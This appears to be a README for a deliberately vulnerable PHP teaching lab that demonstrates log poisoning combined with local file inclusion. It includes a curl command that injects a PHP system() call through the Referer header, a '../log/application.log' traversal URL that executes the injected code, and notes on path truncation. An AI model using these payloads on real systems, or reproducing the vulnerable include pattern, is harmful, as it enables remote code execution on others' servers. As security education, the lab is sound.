# Log poisoning demo

Log poisoning is one way to exploit a local file inclusion vulnerability, but more generally it is the action of injecting syntax into a log and then having some process parse that log.

This example is rather contrived because in `index.php` we use `require` on the file, which causes it to be parsed by PHP.  If the file is included without being parsed by PHP and displayed by the browser then we could deploy an XSS attack instead.  

## To demo the exploit

The package uses translation files to try and change the language that parts of the site are displayed in.

The intention is that the user can change their language by setting the "lang" parameter, for example by visiting `http://localhost:8000/?lang=hi`

### To inject PHP into the log file

Use your favourite request manipulator to call http://localhost:8000 with your injection code in the HTTP `Referer` header.

For example, with curl you could run:

    curl --header "Referer: <?php echo '<pre>'; nl2br(system('ls -la')); echo '</pre>' ?>" http://localhost:8000
    
This will place the poisoned code into the log.

### Executing the injected PHP script

Now visit http://localhost:8000/?lang=../log/application.log to use the local file inclusion vulnerability to execute your injected code.

## Path truncation

PHP used to be vulnerable to [path truncation](https://rawsec.ml/en/local-file-inclusion-remote-code-execution-vulnerability/#path-truncation) but you can experiment with `path_truncation_experiment.php` to see that this appears to have been fixed.

You can also try adding `/` or `./` at the end of the `$translationFilename` variable.  PHP 7.2 fails to open these paths.  

    $translationFilename = __DIR__ . DIRECTORY_SEPARATOR . 'translate' . DIRECTORY_SEPARATOR . $lang . '/.';

## Template

Template is from https://www.bootstrapzero.com/bootstrap-template/rapid ([License](https://bootstrapmade.com/license/))